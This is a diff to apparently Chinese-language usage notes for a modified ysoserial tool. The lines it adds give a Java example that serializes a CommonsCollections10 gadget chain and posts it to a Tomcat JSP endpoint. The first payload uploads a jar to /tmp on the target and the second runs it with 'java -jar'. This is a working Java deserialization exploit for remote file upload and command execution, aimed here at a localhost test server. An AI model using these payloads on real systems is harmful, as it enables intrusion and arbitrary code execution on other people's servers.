@@ -50,7 +50,7 @@ public class Test {
 
 
 
-分两步，先上传 jar ，然后再使用 jar：
+分两步，先上传 jar ，然后通过java代码使用 jar：
 
 ```java
 package top.inhann;
@@ -75,4 +75,28 @@ public class Test {
 
 ```
 
+分两步，先上传 jar ，然后通过命令行使用 jar：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.Eval;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8080/tomcattest/test.jsp";
+        Object o = new Eval().uploadFile(CommonsCollections10.class,"D:\\javaagent2.jar","/tmp/2.jar");
+        byte[] ser = Serializer.serialize(o);
+        new HttpRequest(url).addPostData(ser).send();
+
+        o = new CommonsCollections10().getObject("java -jar /tmp/2.jar /tmp/2.jar");
+        ser = Serializer.serialize(o);
+        new HttpRequest(url).addPostData(ser).send();
+    }
+}
+
+```
  
